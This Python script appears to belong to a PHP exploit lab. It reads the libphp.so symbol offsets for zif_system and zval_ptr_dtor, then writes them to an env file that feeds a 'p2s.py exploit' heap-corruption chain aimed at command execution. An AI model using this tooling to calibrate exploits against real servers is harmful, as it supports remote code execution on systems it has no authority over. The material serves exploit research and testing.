#!/usr/bin/env python3
"""Read the libphp.so symbol offsets a chain run needs, write an offsets.env.

  python docker/offsets.py p2s-def env/generated/offsets.env   # nm inside a container
  python docker/offsets.py --file docker/bin/libphp.so         # host nm (elf toolchain)

Only the *symbol* offsets come out of the binary.  The heap constants the chain
also needs (`R0_OFF`, `CMDOFF`, the fill counts) are runtime layout, not symbols:
re-measure those with measure/dev_r0.py + the gdb drivers, then pass them through
the environment (see README "Constants").
"""
import argparse
import os
import re
import shutil
import subprocess
import sys

LIBPHP = "/usr/local/lib/apache2/libphp.so"
SYMBOLS = {"ZIF": "zif_system", "DTOR": "zval_ptr_dtor"}
# the calibrated binary these values were measured on
CALIBRATED = {"ZIF": 0x457FE0, "DTOR": 0x64B890}
CALIB_MD5 = "f402b493b1df82cbf34021b4aef133cb"


def nm_lines(text):
    """{name: offset} from `nm` output."""
    out = {}
    for line in text.splitlines():
        m = re.match(r"^\s*([0-9a-f]+)\s+[Tt]\s+(\S+)\s*$", line)
        if m:
            out.setdefault(m.group(2).lstrip("_"), int(m.group(1), 16))
    return out


def from_container(container):
    r = subprocess.run(["docker", "exec", container, "sh", "-c",
                        "nm -C %s; md5sum %s" % (LIBPHP, LIBPHP)],
                       capture_output=True, text=True)
    if r.returncode:
        sys.exit("nm failed in %s: %s" % (container, r.stderr.strip()[:200]))
    return r.stdout


def from_file(path):
    nm = shutil.which("nm") or shutil.which("llvm-nm")
    if not nm:
        sys.exit("no nm on PATH; read the offsets from a container instead: "
                 "python docker/offsets.py p2s-def <out>")
    r = subprocess.run([nm, "-C", path], capture_output=True, text=True)
    if r.returncode:
        sys.exit("nm %s: %s" % (path, r.stderr.strip()[:200]))
    return r.stdout


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("container", nargs="?", help="running lab container, e.g. p2s-def")
    ap.add_argument("out", nargs="?", help="offsets.env to write")
    ap.add_argument("--file", help="a libphp.so on this host instead of a container")
    args = ap.parse_args()

    text = (from_file(args.file) if args.file
            else from_container(args.container or "p2s-def"))
    found = nm_lines(text)
    offs = {k: found[v] for k, v in SYMBOLS.items() if v in found}
    md5 = re.search(r"^([0-9a-f]{32})\s", text, re.M)
    md5 = md5.group(1) if md5 else ""
    if len(offs) != len(SYMBOLS):
        sys.exit("symbols missing in libphp.so: wanted %s, got %s"
                 % (", ".join(sorted(SYMBOLS.values())),
                    ", ".join(sorted(offs)) or "nothing"))

    if args.out:
        os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
        with open(args.out, "w", newline="\n") as f:
            f.write("# written by docker/offsets.py; md5=%s\n" % (md5 or "?"))
            for k, v in offs.items():
                # ZIF_OFFSET/DTOR_OFFSET for the vendored reference chain,
                # ZIF_OFF/DTOR_OFF for the calibrated PoCs
                f.write("%s_OFFSET=0x%x\n" % (k, v))
                f.write("%s_OFF=0x%x\n" % (k, v))
    same = md5 == CALIB_MD5
    drift = [k for k, v in offs.items() if v != CALIBRATED[k]]
    print("libphp md5=%s %s" % (md5 or "?", "(calibrated)" if same else "(NOT the calibrated build)"))
    for k, v in offs.items():
        print("  %-6s 0x%x  %s" % (SYMBOLS[k], v,
               "ok" if v == CALIBRATED[k] else "differs from calibrated 0x%x" % CALIBRATED[k]))
    if args.out:
        print("wrote %s" % args.out)
    if not same or drift:
        print("\nThis is a rebuilt binary: the symbol offsets above are already")
        print("picked up by `p2s.py exploit`, but the heap layout is a property of")
        print("the build, so re-measure before trusting a run:")
        print("  python measure/dev_r0.py        # -> R0_OFF")
        print("  and NFILL/FILLSZ/S3_BIGLEN, CMDOFF (see README 'Constants');")
        print("a stale constant fails as LEAK_FAILED or an empty PROOF, not as an error.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
